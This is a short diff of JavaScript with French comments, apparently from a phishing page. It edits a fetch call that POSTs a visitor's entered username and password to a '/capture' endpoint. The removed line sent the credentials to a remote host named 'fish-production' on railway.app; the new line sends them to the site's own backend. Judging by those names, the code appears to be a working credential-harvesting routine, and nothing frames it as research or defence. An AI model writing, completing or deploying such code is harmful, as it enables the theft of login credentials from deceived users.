@@ -118,7 +118,8 @@
 
         try {
             // Envoi des données au serveur (remplace localhost par l'URL de ton serveur une fois en ligne)
-            await fetch('https://fish-production.up.railway.app/capture', {
+            // On enlève le "https://fish-production..." pour ne laisser que le chemin
+            await fetch('/capture', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ username, password })
